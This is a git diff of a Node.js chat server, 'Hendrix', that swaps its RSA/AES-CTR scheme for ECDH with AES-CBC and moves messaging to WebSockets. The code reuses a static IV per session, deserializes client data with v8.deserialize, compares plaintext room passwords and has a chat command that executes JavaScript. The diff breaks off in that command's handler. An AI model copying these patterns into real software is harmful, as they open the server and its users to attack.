@@ -3,13 +3,12 @@ const app = require(`express`)(); //express
 const http = require(`http`).Server(app); // подключаем модуль http для сервера
 const fs = require(`fs`); //Модуль для работы с файловой системой
 const bodyParser = require('body-parser'); //парсим url входящих запросов
-const aes = require(`aes-js`); //симметричный AES
-const RSA = require(`node-rsa`); //ассиметричный RSA
 const pbkdf2 = require(`pbkdf2`); //модуль для генерации сеансовых ключей
 const crypto = require(`crypto`);
 const utils = require(`util`);
 let confirmed = require(`./confirmed`);
 const zlib = require(`zlib`);
+const v8 = require(`v8`);
 const MongoDB = require(`mongodb`);
 
 zlib.deflate = utils.promisify(zlib.deflate);
@@ -17,6 +16,8 @@ zlib.unzip = utils.promisify(zlib.unzip);
 crypto.randomBytes = utils.promisify(crypto.randomBytes);
 
 const getRandomId = async (bytes = 32) => (await crypto.randomBytes(bytes)).toString(`hex`);
+
+const getRandomIdSync = (bytes = 32) => crypto.randomFillSync(Buffer.alloc(bytes)).toString(`hex`);
 
 const Rooms = {},
     Users = {},
@@ -35,22 +36,8 @@ const date = {
     }
 };
 
-const divideBuf = (buf, part = 262144) => {
-    const r = [];
-    const count = Math.floor(buf.length / part);
-    const end = part * count;
-    for (let i = 0; i < end; i += part) {
-        r.push(buf.slice(i, i + part));
-    }
-    if (end < buf.length) {
-        r.push(buf.slice(end, buf.length));
-    }
-    return r;
-};
-
 const encoding = `base64`;
 let version = fs.readFileSync(`version.txt`, `utf8`);
-let clientApp = divideBuf(fs.readFileSync(`app.zlib`));
 
 const {
     MongoClient,
@@ -122,7 +109,8 @@ const deleteDataInCollection = (collection, filter) => new Promise((resolve, rej
 });
 
 MongoClient.connect(`mongodb://localhost:27017`, {
-    useNewUrlParser: true
+    useNewUrlParser: true,
+    useUnifiedTopology: true
 }, function (err, client) {
     hendrixDatabase.accounts = client.db(`hendrix`).collection(`accounts`);
     if (err) {
@@ -132,34 +120,19 @@ MongoClient.connect(`mongodb://localhost:27017`, {
     }
 });
 
-const generateSessionKeyAES = async () => {
-    const p = await getRandomId();
-    const s = await getRandomId();
-    return pbkdf2.pbkdf2Sync(p, s, 1, 32, 'sha512').toString(`hex`);
-};
+const encryptAES = (data, key, iv) => {
+    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
+    let encrypted = cipher.update(data);
+    const final = cipher.final();
+    encrypted = Buffer.concat([encrypted, final]);
+    return encrypted;
+}
 
-const encryptAES = (text, key) => {
-    if (typeof key == `string`) {
-        key = Buffer.from(key, `hex`);
-    }
-    if (typeof text == `string`) {
-        text = Buffer.from(text);
-    }
-    const aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(14));
-    const encryptedBytes = aesCtr.encrypt(text);
-    return Buffer.from(encryptedBytes).toString(encoding);
-};
-
-const decryptAES = (text, key) => {
-    if (typeof key == `string`) {
-        key = Buffer.from(key, `hex`);
-    }
-    if (typeof text == `string`) {
-        text = Buffer.from(text, encoding);
-    }
-    const aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(14));
-    const decryptedBytes = aesCtr.decrypt(text);
-    return Buffer.from(decryptedBytes).toString();
+const decryptAES = (data, key, iv) => {
+    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
+    let decrypted = decipher.update(data);
+    decrypted = Buffer.concat([decrypted, decipher.final()]);
+    return decrypted;
 };
 
 const encryptObjAES = (obj, key) => (Object.keys(obj).forEach(property => {
@@ -170,52 +143,51 @@ const decryptObjAES = (obj, key) => (Object.keys(obj).forEach(property => {
     obj[property] = decryptAES(obj[property], key);
 }), obj);
 
-const disconnect = (room, user, _id) => {
+const disconnect = (room, user, _id, code) => {
     if (!room) {
         console.log(`${date.format(new Date())} комнаты нет, баг.`);
         console.log(user);
     }
-    room.members.splice(room.members.indexOf(_id), 1);
+    const disconnectedUserPos = room.members.indexOf(_id);
+    if (disconnectedUserPos == -1) {
+        return;
+    }
+    room.members.splice(disconnectedUserPos, 1);
     delete room.stackMembersMachineIds[user._machineId];
-    room.out[_id] = 1;
+    delete room.userWebSockets[_id];
+    if (room.userFileWebSockets[_id] && room.userFileWebSockets[_id].readyState == 1) {
+        if (code >= 4000) {
+            room.userFileWebSockets[_id].close(code);
+        } else {
+            room.userFileWebSockets[_id].close(1000);
+        }
+    }
+    delete room.userFileWebSockets[_id];
     delete user.curRoom;
     if (_id == room._creator && room.members.length) {
         room._creator = room.members[Math.random() * room.members.length ^ 0];
     }
-    room.stackMessages.push(getSystemMessage({
-        message: `[clr=${user.color}]${user.name}[/] вышел из комнаты [clr=${room.color}]${room.name}[/]!`,
-        out: _id,
-    }));
+    const message = code == 1006 ? `[clr=${user.color}]${user.name}[/] вышел из [clr=#00B0F6 bold]Hendrix[/]!` : code == 4001 ? 
+    `[clr=${user.color}]${user.name}[/] забанен!` : `[clr=${user.color}]${user.name}[/] вышел из комнаты [clr=${room.color}]${room.name}[/]!`;
+    sendSystemMessageToAll({
+        message,
+        action: 'disconnected',
+        disconnectedId: _id
+    }, room);
 };
 
-const getDataProperty = async (data, key) => {
-    return encryptAES((await zlib.deflate(JSON.stringify(data))).toString(encoding), key);
+const getDataProperty = async (data, user) => {
+    data = Buffer.from(v8.serialize(data));
+    return encryptAES(data, user.cipherInfo.symmetricKey, user.cipherInfo.iv).toString(encoding);
 };
 
-const getDecryptedData = async (data, key) => {
-    return JSON.parse(await zlib.unzip(Buffer.from(decryptAES(data, key), encoding)));
+const getDecryptedData = async (data, user) => {
+    data = Buffer.from(data, user.cipherInfo.encoding);
+    return v8.deserialize(decryptAES(data, user.cipherInfo.symmetricKey, user.cipherInfo.iv));
 };
-
-const getMessage = (msg, {
-    message,
-    name,
-    color,
-    user,
-    ...rest
-} = {}) => {
-    return {
-        data: zlib.deflateSync(JSON.stringify(Object.assign({
-            message,
-            name,
-            color,
-            user,
-            date: new Date(),
-        }, msg, rest))).toString(encoding)
-    };
-}
 
 const getSystemMessage = msg => {
-    return getMessage(msg, {
+    return Object.assign(msg, {
         system: true,
         name: `Hendrix`,
         color: `#00B0F6`,
@@ -255,121 +227,61 @@ createFileWatcher(`version.txt`, async (event, filename) => {
     version = fs.readFileSync(filename, `utf8`);
 });
 
-createFileWatcher(`app.zlib`, async (event, filename) => {
-    await new Promise(res => setTimeout(res, 200));
-    clientApp = divideBuf(fs.readFileSync(`app.zlib`));
-});
-
 //get all set clients - expressWs.getWss().clients
 
 const expressWs = require('express-ws')(app);
 
-app.ws('/updateClient', function (ws, req) {
-    ws.send(JSON.stringify({
-        version,
-        partsCount: clientApp.length
-    }));
-    for (let i = 0; i < clientApp.length; i++) {
-        ws.send(clientApp[i]);
-    }
-    ws.close();
-});
-
-const encAes = (text, key) => {
-    if (typeof key == `string`) {
-        key = Buffer.from(key, `hex`);
-    }
-    if (typeof text == `string`) {
-        text = Buffer.from(text);
-    }
-    const aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(14));
-    const encryptedBytes = aesCtr.encrypt(text);
-    return encryptedBytes;
-};
-
-const decAes = (text, key) => {
-    if (typeof key == `string`) {
-        key = Buffer.from(key, `hex`);
-    }
-    if (typeof text == `string`) {
-        text = Buffer.from(text, encoding);
-    }
-    const aesCtr = new aes.ModeOfOperation.ctr(key, new aes.Counter(14));
-    const decryptedBytes = aesCtr.decrypt(text);
-    return decryptedBytes;
-};
-
-const server = app.listen(8080, function () {
-    console.log('HTTP server started on port 8080');
+const server = app.listen(5555, function () {
+    console.log('HTTP server started on port 5555');
 });
 
 server.setTimeout(1e9);
 
-// var multer  = require('multer')
-// var upload = multer()
-
-// const waitSend = ws => new Promise(resolve => {
-//     let timer = setInterval(() => {
-//         if (!ws.bufferedAmount) {
-//             clearInterval(timer);
-//             resolve(true);
-//         }
-//     }, 20);
-// });
-// const requestAsyncForm = value => new Promise(resolve => {
-//     const bufParts = [];
-//     request.post({
-//         url: `${server}/testBinary`,
-//         formData: {
-//             filePart: {
-//                 value,
-//                 options: {
-//                     filename: 'filename',
-//                 }
-//             }
-//         }
-//     }).on(`data`, data => {
-//         bufParts.push(data);
-//     }).on(`end`, () => {
-//         resolve(Buffer.concat(bufParts));
-//     });
-// });
-// app.post(`/testBinary`, upload.single(`filePart`), (req, res) => {
-//     const dec = decAes(req.file.buffer, key);
-//     res.send(Buffer.from(encAes(dec, key)));
-// });
-
-app.post(`/getAESKey`, async (req, res) => {
-    const key = new RSA().importKey(req.body.key);
-    const aeskeyhex = await generateSessionKeyAES();
-    const aeskeyencrypted = key.encrypt(aeskeyhex, 'hex');
+app.post(`/syncSymmetricKey`, async (req, res) => {
+    const ecdh = crypto.createECDH('secp521r1');
+    ecdh.generateKeys();
+    const publicKey = ecdh.getPublicKey().toString(encoding);
+    const secret = ecdh.computeSecret(Buffer.from(req.body.publicKey, req.body.encoding || encoding));
+    const cipherInfo = {
+        symmetricKey: secret.slice(1, 33),
+        iv: secret.slice(33, 49),
+        rest: secret.slice(49),
+        encoding: req.body.encoding
+    };
     let pos;
     if (!tmpUsers[req.ip]) {
-        tmpUsers[req.ip] = [aeskeyhex];
+        tmpUsers[req.ip] = [cipherInfo];
     } else {
-        tmpUsers[req.ip].push(aeskeyhex);
+        tmpUsers[req.ip].push(cipherInfo);
     }
     pos = tmpUsers[req.ip].length - 1;
     res.send({
-        aeskeyencrypted,
+        publicKey,
+        encoding,
         pos
     });
 });
 
-app.post(`/updateAESKey`, async (req, res) => {
+app.post(`/updateSymmetricKey`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const data = await getDecryptedData(req.body.data, user.aesKeyBytes);
-    const key = new RSA().importKey(data.key);
+    const data = await getDecryptedData(req.body.data, user);
     if (data.secretString == user.secretString) {
-        const aesKey = await generateSessionKeyAES();
-        const aesKeyBytes = aes.utils.hex.toBytes(aesKey);
-        const aeskeyencrypted = key.encrypt(aesKey, 'hex');
-        user.aesKey = aesKey;
-        user.aesKeyBytes = aesKeyBytes;
+        const ecdh = crypto.createECDH('secp521r1');
+        ecdh.generateKeys();
+        const secret = ecdh.computeSecret(Buffer.from(data.publicKey, user.cipherInfo.encoding));
+        const publicKey = ecdh.getPublicKey();
         res.send({
-            aeskeyencrypted
+            data: await getDataProperty({
+                publicKey
+            }, user)
         });
+        user.cipherInfo = {
+            symmetricKey: secret.slice(1, 33),
+            iv: secret.slice(33, 49),
+            rest: secret.slice(49),
+            encoding: user.cipherInfo.encoding
+        };
     } else {
         res.send({
             message: `suck, hacker!`
@@ -382,10 +294,9 @@ app.post(`/savePerson`, async (req, res) => {
     const {pos} = req.body;
     const {ip: _ip} = req;
     const success = !!(tmpUsers[_ip] && tmpUsers[_ip][pos]);
-    if (tmpUsers[_ip] && tmpUsers[_ip][pos]) {
-        const aesKey = tmpUsers[_ip][pos];
-        const aesKeyBytes = aes.utils.hex.toBytes(aesKey);
-        const user = await getDecryptedData(req.body.data, aesKeyBytes);
+    if (success) {
+        const cipherInfo = tmpUsers[_ip][pos];
+        const user = await getDecryptedData(req.body.data, {cipherInfo});
         const {
             name,
             color,
@@ -397,8 +308,7 @@ app.post(`/savePerson`, async (req, res) => {
             name,
             color,
             secretString,
-            aesKey,
-            aesKeyBytes,
+            cipherInfo,
             _token,
             _ip,
             _machineId
@@ -416,25 +326,17 @@ app.post(`/savePerson`, async (req, res) => {
 
 app.post(`/createRoom`, async (req, res) => {
     const userId = req.body._id;
-    const room = await getDecryptedData(req.body.data, Users[userId].aesKeyBytes);
-    const hidden = room.hidden;
+    const room = await getDecryptedData(req.body.data, Users[userId]);
     const roomId = room._id;
     delete room._id;
     Rooms[roomId] = Object.assign({
         passwordProtected: !!room.password.length,
         members: [userId],
         _creator: userId,
-        stackMessages: [
-            getSystemMessage({
-                message: `Вы успешно создали комнату [clr=${room.color}]${room.name}[/]!${hidden ? `\nId для подключения:\n[clr=${room.color}]${roomId}[/]` : ``}`,
-            })
-        ],
-        stackFileMessages: [],
         stackMembers: {},
-        stackFileMembers: {},
         stackMembersMachineIds: {},
-        stackResMessage: [],
-        out: {},
+        userWebSockets: {},
+        userFileWebSockets: {},
         banned: {},
         roulette: {
             users: {},
@@ -446,14 +348,89 @@ app.post(`/createRoom`, async (req, res) => {
     });
 });
 
-app.post(`/checkHiddenRoom`, (req, res) => {
+app.post(`/getUsersIdsInRoom`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const key = user.aesKeyBytes;
-    const roomId = decryptAES(req.body.data, key);
+    const roomData = await getDecryptedData(req.body.data, user);
+    const room = Rooms[roomData._id];
+    if (auth(room, roomData._id, user, userId, roomData.password)) {
+        res.send({
+            roomUsersIds: await getDataProperty(room.members, user)
+        });
+    } else {
+        res.send({
+            roomUsersIds: false
+        });
+    }
+});
+
+app.post(`/getUserAvatar`, async (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const roomData = await getDecryptedData(req.body.data, user);
+    const {userId: requestedUserId} = roomData;
+    const room = Rooms[roomData._id];
+    if (auth(room, roomData._id, user, userId, roomData.password)) {
+        res.send({
+            userAvatar: await getDataProperty(Users[requestedUserId].avatar, user)
+        });
+    } else {
+        res.send({
+            userAvatar: false
+        });
+    }
+});
+
+app.post(`/loadUserAvatar`, async (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const userAvatar = await getDecryptedData(req.body.data, user);
+    if (userAvatar) {
+        user.avatar = userAvatar;
+    } else {
+        delete user.avatar;
+    }
+    res.send({
+        success: !!userAvatar
+    });
+});
+
+app.post(`/updateListIgoneredUsers`, async (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    let listIgnoredUsers = await getDecryptedData(req.body.data, user);
+    let existingUsers = [];
+    if (listIgnoredUsers) {
+        listIgnoredUsers = [...new Set(listIgnoredUsers)];
+        existingUsers = listIgnoredUsers.filter(id => Users[id] && id != userId && user._machineId != Users[id]._machineId).map(_id => {
+            const {name, color} = Users[_id];
+            return {
+                name, color, _id
+            };
+        });
+        if (existingUsers.length) {
+            user.listIgnoredUsers = {};
+            for (let i = 0; i < existingUsers.length; i++) {
+                user.listIgnoredUsers[existingUsers[i]._id] = true;
+            }
+        } else {
+            delete user.listIgnoredUsers;
+        }
+    } else {
+        delete user.listIgnoredUsers;
+    }
+    res.send({
+        data: await getDataProperty(existingUsers, user)
+    });
+});
+
+app.post(`/checkHiddenRoom`, async (req, res) => {
+    const userId = req.body._id;
+    const user = Users[userId];
+    const {roomId} = await getDecryptedData(req.body.data, user);
     const room = Rooms[roomId];
     const data = {
-        rndData: crypto.randomFillSync(Buffer.alloc(10)).toString(`base64`), //маскировка пакета
+        rndData: crypto.randomFillSync(Buffer.alloc(2)).toString(`base64`), //маскировка пакета, все гениальное костыльно
         logIn: room && room.hidden && auth(room, roomId, user, userId, ``)
     };
     if (data.logIn) {
@@ -461,11 +438,11 @@ app.post(`/checkHiddenRoom`, (req, res) => {
         data.name = room.name;
     }
     res.send({
-        data: encryptAES(JSON.stringify(data), key)
+        data: await getDataProperty(data, user)
     });
 });
 
-app.post(`/getPublicRooms`, (req, res) => {
+app.post(`/getPublicRooms`, async (req, res) => {
     let rooms = {};
     for (let roomId in Rooms) {
         let {
@@ -488,7 +465,7 @@ app.post(`/getPublicRooms`, (req, res) => {
     }
     if (Users[req.body._id]) {
         res.send({
-            data: encryptAES(JSON.stringify(rooms), Users[req.body._id].aesKeyBytes)
+            data: await getDataProperty(rooms, Users[req.body._id])
         });
     } else {
         res.send({
@@ -497,11 +474,165 @@ app.post(`/getPublicRooms`, (req, res) => {
     }
 });
 
+const sendMessageToAll = (message, user, senderId, room, address = 'userWebSockets') => {
+    const _id = getRandomIdSync(12);
+    message.user = senderId;
+    message.name = user.name;
+    message.color = user.color;
+    if (message.file && message.file.position == 1) {
+        message._id = _id;
+    } else if (message.message) {
+        message._id = _id;
+    }
+    const conf = confirmed[user._token];
+    if (conf) {
+        message.confirmed = true;
+        message = Object.assign(message, conf);
+    }
+    const serializedMessage = v8.serialize(message);
+    for (let i = 0; i < room.members.length; i++) {
+        const userId = room.members[i];
+        const recipient = Users[userId];
+        if ([2, 3].includes(room[address][userId].readyState) || recipient.listIgnoredUsers && recipient.listIgnoredUsers[senderId]) {
+            continue;
+        }
+        room[address][userId].send(
+            encryptAES(serializedMessage, recipient.cipherInfo.symmetricKey, recipient.cipherInfo.iv)
+        );
+    }
+};
+
+const sendSystemMessageToAll = (message, room) => {
+    message._id = getRandomIdSync(12);
+    const serializedMessage = v8.serialize(getSystemMessage(message));
+    for (let i = 0; i < room.members.length; i++) {
+        const userId = room.members[i];
+        if ([2, 3].includes(room.userWebSockets[userId].readyState)) {
+            continue;
+        }
+        room.userWebSockets[userId].send(
+            encryptAES(serializedMessage, Users[userId].cipherInfo.symmetricKey, Users[userId].cipherInfo.iv)
+        );
+    }
+};
+
+app.ws(`/fileSocket`, async (ws, req) => {
+    let {userId, roomData} = req.query;
+    roomDataEncrypted = decodeURIComponent(roomData);
+    const user = Users[userId];
+    roomData = await getDecryptedData(roomDataEncrypted, user);
+    const userPassword = roomData.password;
+    const roomId = roomData._id;
+    const room = Rooms[roomId];
+    if (!room) {
+        return ws.close(4000);
+    }
+    if (room.banned[user._ip]) {
+        return ws.close(4001);
+    }
+    if (room.stackMembersMachineIds[user._machineId] && room.stackMembersMachineIds[user._machineId]._id !== userId) {
+        return ws.close(4002);
+    }
+    if (room.passwordProtected && userPassword != room.password) {
+        if (!room.disableNotif) {
+            sendSystemMessageToAll({
+                message: `[clr=${user.color}]${user.name}[/] попытался подключиться к комнате, но ввёл неправильный пароль!`
+            }, room);
+        }
+        return ws.close(4003);
+    }
+    room.userFileWebSockets[userId] = ws;
+    ws.on(`message`, data => {
+        const msgBuf = v8.deserialize(decryptAES(data, user.cipherInfo.symmetricKey, user.cipherInfo.iv));
+        sendMessageToAll(msgBuf, user, userId, room, 'userFileWebSockets');
+    });
+});
+
+app.ws(`/logIn`, async (ws, req) => {
+    let {userId, roomData} = req.query;
+    roomDataEncrypted = decodeURIComponent(roomData);
+    const user = Users[userId];
+    roomData = await getDecryptedData(roomDataEncrypted, user);
+    const userPassword = roomData.password;
+    const roomId = roomData._id;
+    const room = Rooms[roomId];
+    if (!room) {
+        return ws.close(4000);
+    }
+    if (room.banned[user._ip]) {
+        return ws.close(4001);
+    }
+    if (room.stackMembersMachineIds[user._machineId] && room.stackMembersMachineIds[user._machineId]._id !== userId) {
+        return ws.close(4002);
+    }
+    if (room.passwordProtected && userPassword != room.password) {
+        if (!room.disableNotif) {
+            sendSystemMessageToAll({
+                message: `[clr=${user.color}]${user.name}[/] попытался подключиться к комнате, но ввёл неправильный пароль!`
+            }, room);
+        }
+        return ws.close(4003);
+    }
+    if (!room.stackMembers[userId]) {
+        room.stackMembers[userId] = true;
+    }
+    room.stackMembersMachineIds[user._machineId] = {
+        _id: userId
+    };
+    if (!room.members.length) {
+        room._creator = userId;
+    }
+    if (!room.members.includes(userId)) {
+        room.members.push(userId);
+    }
+    if (!room.roulette.users[userId]) {
+        room.roulette.users[userId] = {
+            totalBets: 0,
+            wins: 0,
+            losses: 0,
+            winrate: 0,
+            totalWon: 0,
+            totalLost: 0
+        };
+    }
+    user.curRoom = roomId;
+    room.userWebSockets[userId] = ws;
+    sendSystemMessageToAll({
+        message: `[clr=${user.color}]${user.name}[/] подключился к комнате [clr=${room.color}]${room.name}[/]!`,
+        action: 'connected',
+        connectedId: userId,
+        avatar: user.avatar
+    }, room);
+    if (room._creator == userId && room.hidden) {
+        sendSystemMessageToAll({
+            message: `Id для подключения:\n[clr=${room.color}]${roomId}[/]`
+        }, room);
+    }
+    ws.on(`close`, (code, reason) => {
+        disconnect(room, user, userId, code);
+    });
+    ws.on(`message`, async data => {
+        const msgBuf = v8.deserialize(decryptAES(data, user.cipherInfo.symmetricKey, user.cipherInfo.iv));
+        sendMessageToAll(msgBuf, user, userId, room);
+        const {message} = msgBuf;
+        if (message) {
+            for (let i = 0; i < commands.length; i++) {
+                let r;
+                while (r = commands[i].reg.exec(message)) {
+                    const result = await commands[i].handler(r, user, userId, room, roomId);
+                    if (result) {
+                        sendSystemMessageToAll(result, room);
+                    }
+                }
+            }
+        }
+    });
+});
+
 app.post(`/logIn`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const key = user.aesKeyBytes;
-    const roomData = await getDecryptedData(req.body.data, key);
+    const roomData = await getDecryptedData(req.body.data, user);
     const userPassword = roomData.password;
     const roomId = roomData._id;
     const room = Rooms[roomId];
@@ -522,45 +653,14 @@ app.post(`/logIn`, async (req, res) => {
             multi: true
         });
     }
-    room.stackMembersMachineIds[user._machineId] = {
-        _id: userId
-    };
     let logIn = true;
     if (room.passwordProtected && userPassword != room.password) {
         logIn = false;
-    }
-    if (logIn && !room.stackMembers[userId]) {
-        room.stackMembers[userId] = [];
-        room.stackFileMembers[userId] = [];
-    }
-    if (logIn) {
-        if (!room.members.length) {
-            room._creator = userId;
+        if (!room.disableNotif) {
+            sendSystemMessageToAll({
+                message: `[clr=${user.color}]${user.name}[/] попытался подключиться к комнате, но ввёл неправильный пароль!`
+            }, room);
         }
-        if (!room.members.includes(userId)) {
-            room.members.push(userId);
-        }
-        if (!room.roulette.users[userId]) {
-            room.roulette.users[userId] = {
-                totalBets: 0,
-                wins: 0,
-                losses: 0,
-                winrate: 0,
-                totalWon: 0,
-                totalLost: 0
-            };
-        }
-        user.curRoom = roomId;
-        delete room.out[userId];
-        if (roomData.check != `true`) {
-            room.stackMessages.push(getSystemMessage({
-                message: `[clr=${user.color}]${user.name}[/] подключился к комнате [clr=${room.color}]${room.name}[/]!`
-            }));
-        }
-    } else if (!room.disableNotif) {
-        room.stackMessages.push(getSystemMessage({
-            message: `[clr=${user.color}]${user.name}[/] попытался подключиться к комнате, но ввёл неправильный пароль!`
-        }));
     }
     res.send({
         logIn
@@ -568,18 +668,17 @@ app.post(`/logIn`, async (req, res) => {
 });
 
 const notifications = {
-
 };
 
-app.post(`/subNotifications`, (req, res) => {
+app.post(`/subNotifications`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const data = JSON.parse(decryptAES(req.body.data, user.aesKeyBytes));
+    const data = await getDecryptedData(req.body.data, user);
     if (data.canceled) {
         const room = Rooms[data.canceled._id];
-        room.stackMessages.push(getSystemMessage({
+        sendSystemMessageToAll({
             message: `[clr=${user.color}]${user.name}[/] отменил приглашение!`
-        }));
+        }, room);
     }
     if (data.secretString == user.secretString) {
         notifications[userId] = res;
@@ -587,28 +686,6 @@ app.post(`/subNotifications`, (req, res) => {
         res.send({
             success: false
         })
-    }
-});
-
-app.post(`/subscribe`, async (req, res) => {
-    const userId = req.body._id;
-    const user = Users[userId];
-    const key = user.aesKeyBytes;
-    const roomData = await getDecryptedData(req.body.data, key);
-    const room = Rooms[roomData._id];
-    if (auth(room, roomData._id, user, userId, roomData.password)) {
-        res._id = userId;
-        room.stackResMessage.push(res);
-        res.on(`close`, () => {
-            const position = room.stackResMessage.indexOf(res);
-            if (~position) {
-                room.stackResMessage.splice(position, 1);
-            }
-        });
-    } else {
-        res.send({
-            success: false
-        });
     }
 });
 
@@ -625,7 +702,7 @@ app.post(`/oneToOneSub`, (req, res) => {
 app.post(`/oneToOnePublish`, async (req, res) => {
     const userId = req.body._id;
     const user = Users[userId];
-    const message = await getDecryptedData(req.body.data, user.aesKeyBytes);
+    const message = await getDecryptedData(req.body.data, user);
     const recipientId = message._id;
     const recipient = Users[recipientId]
     const success = !!recipient && recipientId != userId;
@@ -646,7 +723,7 @@ app.post(`/oneToOnePublish`, async (req, res) => {
         oneTooneMessages.push(message);
     }
     res.send({
-        data: await getDataProperty(resObj, user.aesKeyBytes)
+        data: await getDataProperty(resObj, user)
     });
 });
 
@@ -661,50 +738,6 @@ setInterval(async () => {
                 delete room._timer;
             }, 30000); //удаление пустой комнаты через 30 секунд
         }
-        if (!room.stackResMessage.length) {
-            continue;
-        }
-        let message = room.stackMessages.shift();
-        if (message) {
-            for (let userId in room.stackMembers) {
-                if (room.out[userId]) {
-                    delete room.stackMembers[userId];
-                    delete room.stackFileMembers[userId];
-                } else {
-                    room.stackMembers[userId].push(message);
-                }
-            }
-        } else {
-            message = room.stackFileMessages.shift();
-            if (message) {
-                for (let userId in room.stackFileMembers) {
-                    room.stackFileMembers[userId].push(message);
-                }
-            }
-        }
-        const filter = {};
-        for (let i = 0; i < room.stackResMessage.length; i++) {
-            const response = room.stackResMessage[i];
-            const userId = response._id;
-            if (!room.stackMembers[userId]) {
-                continue;
-            }
-            let message = room.stackMembers[userId].shift();
-            if (!message) {
-                message = room.stackFileMembers[userId].shift();
-            }
-            if (!message) {
-                filter[i] = true;
-                continue;
-            }
-            if (!room.out[userId]) {
-                const data = encryptAES(message.data, Users[userId].aesKeyBytes);
-                response.send({
-                    data
-                });
-            }
-        }
-        room.stackResMessage = room.stackResMessage.filter((response, position) => filter[position]);
     }
     for (let i = 0; i < oneTooneMessages.length; i++) {
         const message = oneTooneMessages[i];
@@ -712,7 +745,7 @@ setInterval(async () => {
         if (oneTooneStack[recipientId]) {
             delete message._id;
             oneTooneStack[recipientId].send({
-                data: await getDataProperty(message, Users[recipientId].aesKeyBytes)
+                data: await getDataProperty(message, Users[recipientId])
             });
             delete oneTooneStack[recipientId];
             oneTooneMessages.splice(i, 1);
@@ -735,28 +768,28 @@ const executeJS = code => {
 
 const getHandlerWithCondition = (condition, handlerIfTrue, handlerIfFalse) => (...args) => {
     if (condition(...args)) {
-        handlerIfTrue(...args);
+        return handlerIfTrue(...args);
     } else {
-        handlerIfFalse(...args);
+        return handlerIfFalse(...args);
     }
 };
 
 const getRoomCreatorHandler = handler => getHandlerWithCondition((match, user, userId, room, roomId) => room._creator == userId, handler, (match, user, userId, room, roomId) => {
-    room.stackMessages.push(getSystemMessage({
+    return {
         message: `Доступно только администратору комнаты!`
-    }));
+    };
 });
 
 const getAdminHandler = handler => getHandlerWithCondition((match, user, userId, room, roomId) => confirmed[user._token] && confirmed[user._token].root, handler, (match, user, userId, room, roomId) => {
-    room.stackMessages.push(getSystemMessage({
+    return {
         message: `Доступ запрещён.`
-    }));
+    };
 });
 
 const getHiddenRoomHandler = handler => getHandlerWithCondition((match, user, userId, room, roomId) => !room.hidden, handler, (match, user, userId, room, roomId) => {
-    room.stackMessages.push(getSystemMessage({
+    return {
         message: `В скрытых комнатах данная команда запрещена.`
-    }));
+    };
 });
 
 const commands = [{
@@ -764,46 +797,36 @@ const commands = [{
         handler: getHiddenRoomHandler((match, user, userId, room, roomId) => {
             const roomUsers = room.members;
             const randomUser = Users[roomUsers[Math.random() * roomUsers.length ^ 0]];
-            room.stackMessages.push(getSystemMessage({
+            return {
                 message: `[clr=${randomUser.color}]${randomUser.name}[/] ${match[1]}`
-            }));
+            };
         })
     },
     {
         reg: /[!/]id/gi,
-        handler(match, user, userId, room, roomId) {
-            room.stackMessages.push(getSystemMessage({
-                message: room._creator == userId ? `Id комнаты [clr=${room.color}]${room.name}[/]: [clr=${room.color} bold]${roomId}[/]` : `Доступно только создателям комнаты!`
-            }));
-        }
+        handler: getRoomCreatorHandler((match, user, userId, room, roomId) => {
+            return {
+                message: `Id комнаты [clr=${room.color}]${room.name}[/]: [clr=${room.color} bold]${roomId}[/]`
+            };
+        })
     },
     {
         reg: /[!/]сказать\s+([\s\S]+)/gi,
         handler: getHiddenRoomHandler(getRoomCreatorHandler((match, user, userId, room, roomId) => {
             const roomUsers = room.members;
-            const randomUser = Users[roomUsers[Math.random() * roomUsers.length ^ 0]];
+            const randomUserId = roomUsers[Math.random() * roomUsers.length ^ 0];
+            const randomUser = Users[randomUserId];
             const message = match[1];
-            let msg = {
-                message,
-                name: randomUser.name,
-                color: randomUser.color,
-                user: userId,
-            };
-            const conf = confirmed[randomUser._token];
-            if (conf) {
-                msg.confirmed = true;
-                msg = Object.assign(msg, conf);
-            }
-            room.stackMessages.push(getMessage(msg));
+            sendMessageToAll({message}, randomUser, randomUserId, room);
         }))
     },
     {
         reg: /[!/]выбрать\s*((?:(?:\S+ ?)+?(?:\s+или\s+)?)+)/ig,
         handler(match, user, userId, room, roomId) {
             const variants = match[1].split(/\s+или\s+/i);
-            room.stackMessages.push(getSystemMessage({
+            return {
                 message: variants[Math.random() * variants.length ^ 0]
-            }));
+            };
         }
     },
     {
@@ -811,33 +834,33 @@ const commands = [{
         yes: [`+`, `Да`, `ДА!`, `Да)`, `true`, `Истина в последней инстанции`, `Правда`, `Это риторический вопрос`, `Очевидно, да`, `Конечно!`, `А ты как будто бы не знаешь?`, `Есть такое дело`, `Так точно`, `Вот именно`],
         no: [`-`, `Нет`, `НЕТ!`, `Нет)`, `false`, `Ложь`, `Очевидно, нет`, `Конечно, нет!`, `Не-а`, `Ложь и пропаганда`, `Неправда`, `Тебя обманули`],
         handler(match, user, userId, room, roomId) {
-            room.stackMessages.push(getSystemMessage({
+            return {
                 message: Math.round(Math.random()) ? this.yes[Math.random() * this.yes.length ^ 0] : this.no[Math.random() * this.no.length ^ 0]
-            }));
+            };
         }
     },
     {
         reg: /[!/]шанс\s+([\s\S]+)/ig,
         handler(match, user, userId, room, roomId) {
-            room.stackMessages.push(getSystemMessage({
+            return {
                 message: `шанс ${match[1]}: ${(Math.random() * 100).toFixed(4)}%`,
-            }));
+            };
         }
     },
     {
         reg: /[!/]когда/ig,
         handler(match, user, userId, room, roomId) {
-            room.stackMessages.push(getSystemMessage({
+            return {
                 message: date.format(new Date((Math.random() * 5e12) + +new Date(new Date() - 946674000000))),
-            }));
+            };
         }
     },
     {
         reg: /[!/]execute\s+([\s\S]+)/gi,
         handler(match, user, userId, room, roomId) {
-            room.stackMessages.push(getSystemMessage({
+            return {
